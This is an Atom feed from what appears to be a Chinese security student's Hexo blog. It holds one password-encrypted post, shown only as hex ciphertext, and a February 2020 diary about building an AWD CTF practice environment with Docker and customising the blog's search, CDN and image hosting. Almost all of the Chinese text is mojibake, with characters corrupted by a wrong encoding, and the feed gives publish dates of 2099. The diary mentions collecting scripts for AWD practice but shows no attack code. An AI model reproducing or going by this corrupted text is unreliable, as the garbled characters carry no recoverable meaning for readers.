<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-11-06T14:40:49.114Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Recent arrangements</title>
    <link href="https://hack-for.fun/2986.html"/>
    <id>https://hack-for.fun/2986.html</id>
    <published>2099-11-01T04:00:00.000Z</published>
    <updated>2020-11-06T14:40:49.114Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç ." /><label>æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="e74cff751fdb664faa933549740a3526d92791e4e7c549086f19710385083706">61afebd38ffc14982f9ec76ec5c726573bd142b861af2acf4b0ed22bedd10c4cd054136d6becedc368f6b9bd56ced6d5e49922e629449150040bf277c7dd13b26da3eb642349437adf1d4486539547755004f92c1416f649a23a3fdd279022ecbcf6a37729898d646c5df08007aecb1c65744e7578b3120665c01faa863450946878cdae9d6edf02847b8f9e5c334807633638dbca31c5a0ed8e083186585b5354169b15ac8726031c02446129c5a2d154e0539b1d2d705eeb164b88de7abea4a5f610c7c6a607fb5c040303c4c8c4699c90ca89e9090da7690bce915f38a50db26abc00954f347b269db65b4bee6ea787e75397b1afa84a3c2c15048a194b57416ccd202e21db27aeacf5cdf00d1f17097234cf6cec1231715eda6aa4ba1889b72ffb60652b06535c1ab1a4fb4f9ac7a3fd4d8620ae0bae4af4cc11af9e2a98fab811fa5efc0faa99e1d0df31420a938406d3ef906ffa0f5ac66d1d10cce65669636c89cc9c93b78cb87885d5d6f897bbe7d5cc84ca4f3f5a2668d53d83ea9331c84677e7d095253276e62fe5904447a5e6cd9577c3c0bb1562e5de751d85fe68f9e994d3186106df9db0af24b0da722974571973475c273867f340385dca354e7b9dc7c0cbddd0150116570af501f5eca1d56413ef93de3a98e419eccf75049602bd18e97bcb2d832402536bda493b53d97efda5c34b21fdd6e40c44c841d36c39f46cee669a47640ca9896d02b1dc74d793e619d421022f0d999e6b51327b816dfc5838dcb1a824a96f5bf012905a43fa77ad1121d581f686dfd3b70ec68308c41b9cd0981cf5c62491b1ffc85b4be451f048baa12f09f93eb75d431adad6bc284c84a38a55eb9423c1825e3abe5502280cecf7b3336df66cd2c9e276ef8a438d30837ccd43195b9a3497c9e6d39f1d1b5d5aa9c4a241f781a8d459604ce8ba4c4bcf6d3003380cc183df2ff18fba6ec996269e4f5c976785022a52d0aaacb0b264fda4e7fba780ce8942bb781274b1c30ce77b73a75ef696855716861ce63655cf052f3a0f0d55755e47be2dcd4fe25b8ee4eb1fb7c95e228db1cae61529e989aa4b5620ddbcf30bb40b367d30c31a2feec1d584b7f751c5bcfa7599aea31a827bc3803188baee09ac1b0413fe311050c39cd1f7fce87f4bf16c3253a27c3322ce17c9264d39a7801c25a13c0b9a276cb9bf77266bf7349cb4c8ff47c4d446065e2924d29ce1e69d79c9315e13fd9804c7346da07c5df892814b4e7f8631b516e9b5a0608931a85e6401b66f31d18783f50b48d336d937c637df59fdbbde1fc8333c962c9c5956e88167f52dff3bc992d36762dab0b4c25c6ec1c9068cdcb0b3d222383eaa32edcee0efbc742085c3c75f0e00ccd7d4cadcd0d5d46a63c87cbd8c89c1ff0f8d3a643b6662551fb081e140616c6e9ccf6e0a6b39ae44c65cdc29e079309f1bfc8f546fcb9b17c2ca5b096f3fc4e54921810efe83ad6c91aea57537b9b878a59d92c1710f68cccd0b4d5dac13a3eb4ceaac165810de0b0bd51bac9c3f0d976beb7c82d22f42aa7238f9024fc2408a263f676c8f8e436fefdb276e97edbbfcf48e29a1a57af424a8cd74e3ad542257d14bfcfd08f7dd5587389a705cc6a6a9d67a460d1f38a7cbe75c72428482d0f2d011e54da9fa6031a983af019190734d29c3230376181da775b7f15ae1ec76ae2df1fe1e7ce27056fe5f60996f5834b5ec40bf1593d148a5ddf9a46e93405d7b4c318a78e061288985a947989f9dad3e4a46890546708b600536cf732709cef1934c9fa4617dd2823aabe9cf77cff423723062fecf1c2a98fd74c5b9983cfb4d3d440fbd810385c482064f2fa9acb1d7c099a2807b61ebb1ac76ddf2ea6b459bc633d36e572e6d46785bee867fca4262a8fd2d143542ed8c48fd89ad75d4c4837f9aed100e468452829b135ab2ac06520c5d882c7cfc49ec3a2839cd2c8172b4653c7fed5d0919963e20afed54b8ba5ea98aba1d99d02197ab5941eb94d5bf067237afb0747c6421a4d8ceda5fcc4ed9b6970fb1017865d2c6795fe8bf9649ce65a9a779571a6d1f73785ce52edf320cca5fca3f37fba9dcde3810aa1d273d9dbac5f073898ddd927863b1d7afebbafe338eb4eec774784ddb210cfa733a6e0fa5fffe30e13e84a28611d331e67866e21fa0f27f1244622d416b2178dfb5d3094b9b0ab0acc61f3d24d83288c9e9742d904a000de3da448277df677283d6bceccfa6fe6c3e54933995e79c116982c812846f9848bc6324c78d20dddf0c5a49b04508e84032d1c3a6cf01848f7a01fb1c72d246b58c72bcac28273a7dec151bb4d64609257fc5a216e59263b3fda96c4eb5bd8ae8e7f460e01a85fc5a6aed0284c913f41171b929719d7fbc9cd90da4c206bcebd99f0bb471dd82c9b590e91125ef1039bddfecff69669c8ae89087437503ab7f39b5c222407ab900f92b48f57a5c56ca6633c1c92a8f7d15bfb85472ef187c050065c19a839ca3343a85c62cfa75e9223c365f6f6e4fabd25dd38747f87cb9dd2796bff7adb2257ca772dd2a7f4d32fd403bc9d618b84ea36b0d940b1e832b8754b070b4096a8816cf24b6d0c6dc9decb7b15ec8751e3f9450681add12524a48ac7205f8cf77ee004ac94ac893625fd37e251842a22e2c652af8af81a494841ed8aad3576d9e6fe6f698b75e41aa801de70b683d06cee0551a4402afffd23c944b086776bad6905a86ee94f015077a8a21ae621ec0de82f30e6ef9dd82fac2c75c9f3220c14bf3b680fb31c970ec0e6d56d2dc7eac1a7b9690df2403a568a0909993602927194324aea471bf6ee00ca89df849488b85c7bd4de8a3e8c58df8dcdd12cd9fc30e232cfb41d56bc66908130ae63b0daf5474d7c75dd5281497e2b53fb5dd747aca6043b69cb1ae0b488a661cbfec2acc19e6a2097aec07aa9f74eb8a0d06407eb70cbc45d0fa7c0ff55b93cd9f43ca9d7ef1a0989695b1db284d16984d509afe2622bea8a878d9168a176d21a779311868b1797bca338980cb92dce32993185e52c2093b13a2e52a5e92ffa09482bfcfe68c7f3e5651e7fecdd57a1cd27af87eacfd82face8a689daced5dd1d33c48b64a42d54b2e108f69423f2fb2c078fe3c94de7b31934bed33e6261154958b9fbe03b220c6fbba019dd719283aacc781ab9794c9e760a519e050e7c4cfef962e9df6b2f9bc89365d330bc3704938a674a3d884443cf8d1c1a343dbf35e6382cd8ca49f3f55b84fa01dc52fe5e298f50f4dacaa9413d4f2480aaee08add006bdc29d0c692ac37ad298caae9818ae1ed90cda9de3d6bf01627a0fd1be93bd4feebfac96ae5fa18cb17e32f6a7284062ce11a35c85308e7faf46783124e27a1c2e6052fa58a27ca56e5a170898a5d0e0f4baff9307043a1bf7960e25f4d76d31c1c78bfbbed5b6ac5045a6e19d8bc12a038d550a3bd3a3eb36309d6385d85132bd3846c0555b0c4547e6d71d49e434b1c5649efed7d60f4266c415c3fdc4d2079144dc07bd67b4454e2bb181b2f06632757b9086c98de18a7d7cbb2df40cddafa70af3f2a8fb997a310278381eaa72f127da7a5f1d1bf49213697d26e87db5804e465762c7d4897935ac7246e653a152e6fe4f1aa05898daa9a2590d6d41f26c06faa45fccf7afd6aa379b08139d8e4e70fdcc7a3d53f923867d3c0c6aabf789a29368f4d1e9bef18a961e75db4b680d4efdd91956642837ad146618e9df794853ca8814dc35142a8c1a61d39ea246f360c6c3af5188a30fd650827a3f4fb552bc4a066fe54037761ce970f9a500e7c5b115c934b5d10bdc58876e7d5ef53ef2121f7ba2525663896bb71ce9d5a9187ab9190b46216efacb7da2a6442e6042d8ec165b65b915b243a0a15fc23b433f5d5c07d2078e90a0724cf48425c513edd6e1465bb770b50db9add27e8bb9023d87cd7e2527efdb6f7bae6ccafeae47128287566552aeb885b3ad75bfb1e1147c5b47643b15c8710fa0111796ecdfd0394d3c9e4bb372704af3b9632bcb5cd6bede6f5704f51dd48bd55a362c1f2d0767cdde9491d9b2d1050e83dc78042e7024c216987a12f8db4139177896099c2d8646a0cfd5658dd46589d7401914deebbb59125a108bf1176e36f786679b776a20af4657f632135000ca97e8bc1cc4ffd77a9934a9cdf175d91e8e4b5330c6c5cda7b31974a08fc016819723e8efe4de3aeb507e4dbbcd5f53a0e539c2672a51d493ab586d427689ee1a780760c12fa1b9c9cc6df6ae4e9f242642179b0502b9e806462c419d4975895fc3217eb2c040e68d511f7607dac3053bd0ee17645a39c38b3bd472d9318cf042fc354297bb88ce1e745fddafc4b14fcc2569580ee72d879ee899d9f8ffdb9e223f1d80b283b7d0ab99949a6b819a0e128af7ff482fe74c3366a278174cb49e58368aa7359e20025ebec446ceae19ed22c26c62e5bfdf5cc7030a8e772c7582f103b6a18c0c38e3feb1674aa5d698212aca194b87fa3d01f8ffc31bb1996c6c48555b3615db6b3e886b8e9d1cd939b388db903376e54845b7161140f17d42962d183ffd3d2c5457e045815192a3e67b93972b25a03202af11a23b05398c04b072d69b4decb29fde1a4f3c6419c321e848e664c5dc01bd86ff9f63d7c74f0ed5f58727284ee31a5d609e66101224f318eaf8e4fae4b538d795f9bbd48ba0204282afec9904bf920b8de8b3cec018d23673e13fb95b8817f2f55959d852ee8bd11b640f5ae6a40a6dcf365afaaf95c49249bc7a711c30e08b32e89b6646208f5b2be6aef25ccf41103b31f1be394458d476f2b5737dd8b7f0b9b49e136628d244239305ca57e20eb642170b268eeaa8a9e38bfde712e6828a9adf7a55c80667a15cbb221ab51b2a5353296675d79adabb2c5f3d91b11306d88a5d7260d5cccaccb7b92d9f261f53ae94bf137e6417b7f4ebbc54f748991077e13cfc1a7acd4c3d4d54e42886f26ca2873c80867f85a4011489a11909aece434620cae95c2fd847f12578161fc25cb0d1d9ca688ce91a1d044cc98445c8d5b2fc070e2e0d820d5e6cf9fe4f655ea2d80797fc58f45a2269dcc40991d7fd83e3e2c0bc1e939dc7b4d888869156f1e17eac347b1e2e98704042b18bd9fd39a6360a6dc9c5fdb12745dd3f7c013f9b091cae1329537638f393eb93f80b78717adc59007be42a73966c30a10b0491fda80beb81bb1087fe0569bc1381eefb6e899c159dc13c878340b8c29ec435fc466a897a99fa624ce76a46b90e7d6416e6cf6654de9e791f70f646f604935717b34499de3d57bb644cc401d1089e0535d438946391e8e5eda66f3df8b301ce357710764908c976126e80f568828363b88c2d42edbf82e8af2c0f5bca08c8662934c3559bdf584ea5dd347dd2b197c6bfa4fc1d74e7f415713aea6d9dffbf306113e81e38c7e312809c00031ee7b87b76dbb510b96312afa8d27649ca7486bdf440d814afc59edd2dec459120abb70e770472f4846b9aafd1f1a2b245f13ddcc15a04a3d8595754c5c593ff294b2768a79a32c5e7c3e9b2920903edf6094360d899b43560cca00d0b86e12d24fea2ea28628058e4412fc1e57c28fe612359fcaddfb06beb5ba0a014ae4ce950560cb91782ad549de6168c061bc6cc3a9e5828c851f59cd657c0a160cc44cb9e8b88e90edc001a664ea27877461d56ec766c575790457dd5b528f2fa38815bf7f475198f3b88d7f2e121fe413f1d3b519ecca93a4de83eda4739d04a638704cbbc6ae706ac74fca43f432a13ee42ab05b56d2ed77ab444b2b831f01e9d4318d14ea955611624b92816319985dff9b54f8bac9bb75d932cb793419a22a230af14231190f9ab0eb6dca579500e52d3b23550b0ebcc240109f2bc535b1740746302da646b5ed609917efbc58b46baee3dedbe6363999794280c4a15a3008ddb5bef61a22edf68cc70c52e01061f8f7649e00b687d4ad30d9cd78739fd8906ac1bcaaffa70a4e1f1681bd3b9e0500c9ecf7a2596def0b3e646ee88ccee07fca51506f916d353e55175c53380a3a562ed4281e339c47ddc14190b027e26cb825133df1d9c9bc93809338613bdf72379f4885c6b75c3eb555a60a2b679b566c76f9536fe13d3a174ca9ef643f8e8b99ff713fe2881da1b2af5289e654cf151311df0f48427d3b9c7f03e5188429db44241d71e33f9c702a3d63f03c412a1185217d7fdb14ecc7873d648376e011357b086a80f67ba7716f9719153fae57ec7850a6dde3cfd2f05bc7946447cf40e9d02aa2dd5794e27926164f948998b36f3f5dd87c62e5e5d2656eed19eadadc4baa90274eb4508ed5cc5237e0ac098b0f8e8244020ce1e3288d6b2a4e0f06285d9fab0f18eafa54d5d7c7e99ce05f632ea960d021fe0ad4ee6107219401a9c710d0826afdd679a4def97fe02ab3dc18581590b53a9756c83f7b5516294346539cd54bbcaed5f218d391f4141c3997b5699ec91808a0b8543cf24ea90b065a8b72f4be5e7a6dada6de4ec9a5eb526b9f6aaf9ffe0c0bb6ee0eb26a274d9478991df9a5b86b10f99fd44ee478abd074349d681461d47a18bccb01dad5e8d30b745283e51795170ecceed16ee44093e4e855de9bb7cfdb326c448658fbe270584e28b10a90f4223722be31beb6791b24b733a779d6abbe1a806a6d226227527583ed882a974870c2203ccce1c8a215fe8614f99aaf96c2c90caab0dfb05876a756d49b475b8333e46784a68677d603044b2f2ce95b64ed01c53808db87df01525f008bd38cec64c57d7c4a30a5254994feadad45b1ee201f4afab980f480a902ff5b9df5e82bf1b2e1f025d2eee28f54804a5cf9bc8fb47e3850aeae8ae16d42ebb3c60a5919baa2614c42d5fc365284793f67b61e4ca3f16fd6ef4b7fe6d0a4269174905250b82e5c7036000d37999734da2cfeafe812107f26d3c64fa95d1f9db584645252a9697a88f188db2acc5f246b74ebb041cafcc9320fa8eaf5494277a8ae358798961a4444b05fd53138aefef8be0677a772c47cb6f98eefa4741d71817774e42f8041ce4bb1d49a1b5741eed00ab0babf608f8e5a9379898368f2c91d66c0f9d49f691768dbd5289ab11543ef220f564287327dd49407dddc36d1767f62c1054cdab7b091b2cc29cfa6a44cdaa8365bfd69be6752868ed3562cc82a73d5352db86f31cbdfa2b5ac63a0de6cac4d1d26d895a9203008153e2f51b564e20611bd302a239c78d566df7b8ead338042082fd5da5bb5b620d55bfeff56e68c9922b2b9c0f817cab3c02b61fa9e2471395f7cbfbcc255ce23d34eb18bd7ad76c97614d849c43fefdc47fb91bb6bdcaf4587a6502531111343f2a5bb118c2d1d0389d5f172ee58824740599159b5b94176b85da1c79beedd4b06941cf92128d0c826e6a8cd1e47fdac2fc7d4e1caeabe74432875bfb3a6986dc2461bb59482ad79545f15deb6f86f10ab3ce67cd15f242cede1fc37e27448eda549d4c0a8e1aaa5c665f3475a911b825f596921b0abc7b4ceb877553ecc4a7eee6a8b8ce4f709ddb16e25ff5cbc7bdc5bce9ebdbd8377a62ec75b7bb90ee716897fb95196b819f076cfe437eb13138ae6d46edd060052c511c4d0b3469cbdda3e9525a317417858c8c1fe14707edfad20a1efa815281dd6b4efd15c9a91bf2a165c822bdfe67e44d3a2b07c5602ef0103d5b66ee8bb972ce8aaaa7705da516a61b04bc5ce8e0e8b93883193dac53f5ee352f157e0b676cabe030efddadcd9111828a7eb4965c083f238b373b29c3c43d18bb02f14176df9aa1f7b16b1b95d1b619e4ca22d8cf3b8a01cd9b1bb55785b594d6113d68e0603eed59dda2298d2bda25ea6a4da19f68e8cbc8f63ae820e74d1ba21ffddea481cdb8642c81b146119a0b5b60f0f74df765b687e5e08c9ead0f1db421588014724cff6ebe9d78417cf6ffad7ab320245b4f9fda7602289f9edda119f1dc4f7829102524d0dd01ec7ad0467a5121aaf735ef0f8f8e4d2eb01ace09be0b631283d308490e30c8e6c588f00132296a1e8577684d8e81feb7ce24316ca49d9731eb64d5fd43521631aa2efac595e3212ffcd3d7ce5b3e444e2f56770f4599d772fa6424833e410f7dd4384d5138d0108f4c131546cac59e50b0e65f13192fd5e03fdd3f59127bc5b310c61cdc74e9185f91fe88724cfab4b7643322a71732abf3b86bb3d09f0bfdba95fba038adf07794baaeedf9d203f3f648ff12502d35728dd4a8d43fa4e66076efed29b87a2678004345701b3738f3389b349f2ef23740ee016ff621a1d24656884bfd0a83afda6a37d8d2ce7183a6e94ba26e46a58e154fa862923dc522da39a0e23b80a585a4d645fa753af7b2eaf6a66ac34ef251f42dfbb53393ecd9ed75e4b29601855f7f52941063fae7284e73886b94307041f2a7af3e3dd85e4d28ae79a2eb30a3c87831634c744a104f197cfc038948f1a25279ff019d6fa022202f5379dd1a5776bed34b4ff7baeed8961ac571d078b1e2641a04ca617f8820a1d91bd6ae8940ea12b019acd0b22f1e8d13780c41e2fc2b3632411f0ca6459c4b38703d5c8fe7a46c468a7a46542c4d2987ec126b40cef25a86f47a4e4fa177663fb4d3d36d1d57b31aa808714e1a8011bc38f0146f101a05243481bc98c5d0ac9acdb4d9531ac2325337a2ef98429f0e41d1e21e797eb9db2566d0544cd1c45756af285859b5f3f53983c808a16989a290200df0c9f6b14c5160614e7e7d23c5a1c8774265afbb76210278f5bf6ce80af462f09b62e749361a6c02fc580fecc0c77dc92ebaec375ff22adae98bba9957a03cbe81a288934efc81411963e1009da6a9c24a02801a8ca88dafe1da6f3babb3e977f82c283b0ea453b6bb1cc7b85e282e06561f9c5dd49ff8cf75d8a45bc05e2ee41e1f2c971b8907d809e1bd43b55a6c3f026dfeaa74e91bf5aa0f922f67f6923a99252ddbf6ef687a301598213816c8db12580ec6cfb821163910c570c6adcd2d3a5e8acb9fe4ebffcd1d78daa4df1e9d8c47847c48520501510288accf5692add9772cfa57bb2d005cf36a9a58412fbe2ba485341edd529c99ee3d7c2af313e8aa8bca945a7976887ba7bba2d35fc5c7ba73436e4d0f70fb7c46d0fe746ec27ef93c971d5fd9c3f6b8d5dbe59cdcf7443e0ed2c14827d48cb5d659229d1914470403b9156c6e1fb8a17300a5e85fc7292cfb040815c0f922a465c16287b1a412dd49667872930800773bf2eea04e3a5c2a0260b3e1215feacfdd88ed2c616911d75081f42cd05e349a5fcdbe79a4db4e86567a6651e9ec42f79e6bfdee808b1956b41d569eec370acb8cf0d79ae4984c4f15d03d7fdd57cb2eb1a387b0fa45538fc7ee50d3c9561c3d8688e7b7d589ed2192d491695c0c32e7c3e5440e0b092a542e74d20169fcf6f108ad1998ececa8c5364fc950bc0019976480de2d46942511ba86d44fa2d3ba2bafc047d1cb4315c1803d2c1c2a3c05afb298af2008f76148dd890674ea39e7262e236cda0cf88dbc782f790ef63e7a65e3e79a50d592f1b027c20d99032152cfe90622aad2de7f8f1ea5f6766456e3928eb7da9a4c402337b7ad9dc62671fbc2239dc791763ae9efe56ae94e4daf1927d85357adc93eb378085edf16ed3c3d585cde4ee72f61ed5ceaeacf8066c207a5ca6f88d39b4439a4946f17d34b0c7e6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">æœ‰ä¸œè¥¿è¢«åŠ å¯†äº†, è¯·è¾“å…¥å¯†ç æŸ¥çœ‹.</summary>
    
    
    
    
    <category term="æ‚ç¢" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://hack-for.fun/9b1d.html"/>
    <id>https://hack-for.fun/9b1d.html</id>
    <published>2099-10-31T16:00:00.000Z</published>
    <updated>2020-08-25T08:45:40.491Z</updated>
    
    <content type="html"><![CDATA[<p><strong>å£°æ˜: æœ¬åšå®¢çš„æ–‡ç« å‘å¸ƒæ—¥æœŸå¯èƒ½ä¸å‡†ç¡®, å› ä¸ºæˆ‘è®¾ç½®çš„urlæ ¼å¼, ä¸€å¤©åªèƒ½å‘å¸ƒä¸€ç¯‡æ–‡ç« , æ‰€ä»¥æˆ‘ä»¥åå°½é‡åœ¨æ–‡ç« å†…æ³¨æ˜å‘å¸ƒæ—¥æœŸ</strong></p><p><strong>ç½®é¡¶: åšå®¢URL ç»“æ„é‡æ–°è®¾ç½®äº†, æ‰€ä»¥ä¹‹å‰çš„é“¾æ¥å¯èƒ½éƒ½æ— æ•ˆäº†-.-</strong></p><blockquote><p>é‚£ä¸€å¤©æˆ‘äºŒåä¸€å²ï¼Œåœ¨æˆ‘ä¸€ç”Ÿçš„é»„é‡‘æ—¶ä»£ï¼Œæˆ‘æœ‰å¥½å¤šå¥¢æœ›ã€‚æˆ‘æƒ³çˆ±ï¼Œæƒ³åƒï¼Œè¿˜æƒ³åœ¨ä¸€ç¬é—´å˜æˆå¤©ä¸ŠåŠæ˜åŠæš—çš„äº‘ã€‚åæ¥æˆ‘æ‰çŸ¥é“ï¼Œç”Ÿæ´»å°±æ˜¯ä¸ªç¼“æ…¢å—é”¤çš„è¿‡ç¨‹ï¼Œäººä¸€å¤©å¤©è€ä¸‹å»ï¼Œå¥¢æœ›ä¹Ÿä¸€å¤©å¤©æ¶ˆå¤±ï¼Œæœ€åå˜å¾—åƒæŒ¨äº†é”¤çš„ç‰›ä¸€æ ·ã€‚æˆ‘è§‰å¾—è‡ªå·±ä¼šæ°¸è¿œç”ŸçŒ›ä¸‹å»ï¼Œä»€ä¹ˆä¹Ÿé”¤ä¸äº†æˆ‘ã€‚<br>â€”â€”â€”â€” ç‹å°æ³¢ã€Šé»„é‡‘æ—¶ä»£ã€‹</p></blockquote><h1 id="2020-02-10"><a href="#2020-02-10" class="headerlink" title="2020/02/10"></a>2020/02/10</h1><ul><li>å­¦ä¹ äº†Docker çš„ä¸€äº›æ“ä½œ, å‡†å¤‡éƒ¨ç½²ä¸€ä¸‹AWDç¯å¢ƒ ç©ä¸‹æœ€ç®€å•çš„,å†™å†™ç¯å¢ƒæ­å»ºæ–‡ç« ,ç›¸ä¿¡ä»¥åä¼šæœ‰å¸ˆå‚…ç”¨åˆ°çš„</li><li>æ¸…ç†äº†ä¸€ä¸‹ç¤¾äº¤åœˆ,æ¯”å¦‚è¯´å–æ¶ˆäº†å¾®åšçš„æ— ç”¨å…³æ³¨,æ–°åŠ äº†C9è”ç›Ÿçš„å¾®åš,å…¶å®ä¹‹å‰æˆ‘éƒ½ä¸ç”¨å¾®åš,ä½†æ˜¯å¾®åšä¹Ÿå¯ä»¥å½“åšæ—¥è®°åŠŸèƒ½,æ‰€ä»¥åˆä¸‹è½½ä¸‹æ¥äº†,æ‰€ä»¥æˆ‘è¿™ä¸ªåšå®¢æ—¥è®°ä¹Ÿä¸ä¸€å®šä¼šæ¯å¤©éƒ½å†™,æƒ³èµ·äº†å†å†™å§ 0.0</li><li>æ•´ç†äº†å¾®ä¿¡å…¬ä¼—å·,ä¿ç•™ä¸€äº›æŠ¥ç¤¾,ä¸»è¦ç•™ä¸‹ä¸å®‰å…¨æœ‰å…³çš„å…¬ä¼—å·</li></ul><h1 id="2020-02-11"><a href="#2020-02-11" class="headerlink" title="2020/02/11"></a>2020/02/11</h1><ul><li>æˆåŠŸæ­å»ºäº†AWD ç¯å¢ƒ ,å˜¿å˜¿ å¼€å­¦å¯ä»¥å’Œå®éªŒå®¤çš„å°ä¼™ä¼´ä¸€èµ·ç©å’¯</li><li>ä¸‹è½½äº†Xshell è¿™ä¸ªä¸œè¥¿,ç§è®¤ä¸ºæ¯”Finalshellå¥½ç”¨è®¸å¤š,ä¸¤ä¸ªä¸€èµ·ç”¨å§ 0,0</li><li>æ–°å¢åŠ åšå®¢æœç´¢,<del>ä»£ç å¤åˆ¶</del>,è¯„è®ºåŠŸèƒ½,ä¿®æ”¹é»˜è®¤URLæ ¼å¼(è®¾ç½®ä¸º/posts/æ—¥æœŸ),ç®—æ˜¯ç»™åšå®¢å¤§æ¢è¡€å§0,0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fi3ework&#x2F;hexo-theme-archer&#x2F;wiki&#x2F;%E5%90%AF%E7%94%A8-Algolia-%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure><p>ä»£ç å¤åˆ¶åŠŸèƒ½æ„Ÿè§‰æœ‰ç‚¹éš¾å‘€,å…¨ç½‘éƒ½æ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆ,éƒ½æ˜¯ NEXTä¸»é¢˜çš„</p><ul><li>ç¡®å®å‡å°‘äº†è®¸å¤šæ—¶é—´åœ¨æ— æ„ä¹‰è®¾è®¡,çŸ­è§†é¢‘ä¸Š,åšäº‹æƒ…æ›´ä¸“æ³¨äº†,äººä¹Ÿæ›´å¿«ä¹äº†.å°±æ˜¯è„–å­æœ‰ç‚¹ä¸èˆ’æœ.</li></ul><h1 id="2020-02-12"><a href="#2020-02-12" class="headerlink" title="2020/02/12"></a>2020/02/12</h1><ul><li><p>æ¢äº†ä¸€ä¸ªåšå®¢ä¸»é¢˜,å®ç°äº†<code>ä»£ç å¤åˆ¶</code>åŠŸèƒ½,ä½†æ˜¯<del>æœç´¢åŠŸèƒ½</del>åˆæ²¡äº†,æˆ‘å†³å®šå†ä¹ŸæŠ˜è…¾åšå®¢è¿™ä¸œè¥¿äº†0,0(å› ä¸ºä¼šä¸Šç˜¾</p></li><li><p>ç©äº†ä¸€ä¸‹AWDç»ƒä¹ simpleéš¾åº¦,ä½†æ˜¯ç”±äº<strong>æˆ‘éš¾ä»¥è§£å†³çš„é—®é¢˜</strong>,æ— æ³•å®ç°flagåˆ·æ–°,check,å› æ­¤ä¹Ÿæ— æ³•ç”¨è„šæœ¬æ‰¹é‡æ‰“</p></li><li><p>çæŠ˜è…¾äº†ä¸€å¤©,æ”¶è·è¿˜æ˜¯æŒºå¤š(å‡è£…  </p></li><li><p>ç äº‘çœŸé¦™ <a href="https://gitee.com/ifonlyddw/awd-platform">https://gitee.com/ifonlyddw/awd-platform</a> ä»¥åéœ€è¦æ­å»ºç¯å¢ƒçš„åŒå­¦å‘€,å¯ä»¥ç›´æ¥å…‹éš†è¿™ä¸ªä»“åº“å“Ÿ,é€Ÿåº¦é«˜åˆ°<code>10M+</code></p></li><li><p>emâ€¦æ¢äº†å¥—AWDç»ƒä¹ å¹³å°,æˆ‘ä¸ºä»€ä¹ˆè¦é€‰æ‹©åœ¨è¿™ä¸ªæ—¶å€™ç»ƒä¹ ä¸€ä¸‹,ä¸»è¦æ˜¯å›¤ä¸€äº›è„šæœ¬0,0</p></li></ul><h1 id="2020-02-13"><a href="#2020-02-13" class="headerlink" title="2020/02/13"></a>2020/02/13</h1><ul><li><p>ä½¿ç”¨CDNä¸ºåšå®¢åŠ é€Ÿ, å¯å‚è€ƒæˆ‘åšå®¢çš„æ–‡ç« æ¥è¿›è¡Œ,é€Ÿåº¦çˆ½çš„é£èµ·,</p><p>æ›´å¤šåŠ é€Ÿæ–¹æ³• <a href="https://blog.sky03.cn/posts/42790.html">https://blog.sky03.cn/posts/42790.html</a></p></li><li><p>ä¸ºåšå®¢æ·»åŠ ç™¾åº¦å’Œ<del>è°·æ­Œæ”¶å½•</del></p></li><li><p>å°†åšå®¢åŒæ—¶éƒ¨ç½²åœ¨github(å¢ƒå¤–),coding(å›½å†…),åŒçº¿æ“ä½œ,åŠ é€Ÿè®¿é—®é€Ÿåº¦</p></li><li><p>ä¸ºåšå®¢æ·»åŠ robots.txt</p></li><li><p>è¿˜æ˜¯æ²¡æœ‰æœç´¢åŠŸèƒ½ 0,0</p></li><li><p>emâ€¦.<del>è°·æ­Œå…¨å®¶æ¡¶æœ‰äº†</del></p></li></ul><h1 id="2020-02-14"><a href="#2020-02-14" class="headerlink" title="2020/02/14"></a>2020/02/14</h1><ul><li>å¯ä»¥è¯´æˆ‘æŠ˜è…¾åšå®¢æŠ˜è…¾äº†ä¸‰å¤©å‘€:call_me_hand:</li></ul><p>ç»ˆäºå®ç°äº†æœç´¢åŠŸèƒ½ issue close <a href="https://github.com/blinkfox/hexo-theme-matery/issues/323">https://github.com/blinkfox/hexo-theme-matery/issues/323</a> </p><p>çœŸçš„å¤ªç¥å¥‡äº†</p><ul><li>å®ç°äº†<code>Github + PicGo + jsdelivr </code>æ­å»ºäº†å›¾åºŠ,ä»¥åå°±ä¸ç”¨å…¶ä»–çš„å›¾åºŠäº†,æ–¹ä¾¿ç®¡ç†</li></ul><p>å°±æ˜¯PicGo ç›®å‰ç»å¸¸å‡ºBug(æˆåŠŸä¸Šä¼ çš„å›¾ç‰‡,ä¸ä¼šæ˜¾ç¤ºåœ¨å›¾åº“é‡Œé¢) .æœ€å¥½ä¸è¦ä¸€æ¬¡æ€§ä¼ ä¸€ä¸ªæ–‡ä»¶å¤¹, ä¼°è®¡ä¸€ä¸ªä¸€ä¸ªä¼ ä¼šæ¯”è¾ƒå¥½,å¥½åƒåªèƒ½ä¸Šä¼ <code>.png</code></p><ul><li><p>æ›´æ¢åšå®¢èƒŒæ™¯å›¾ç‰‡,å¢åŠ æ¨±èŠ±:cherry_blossom:ç‰¹æ•ˆ</p></li><li><p>å¢åŠ æ˜¾ç¤ºè®¿é—®è€…IP</p></li><li><p>ä¼˜åŒ– åšå®¢ SEO æœç´¢ , ç”±äº<code>.fun</code> åŸŸåçš„åŸå› ,æ— 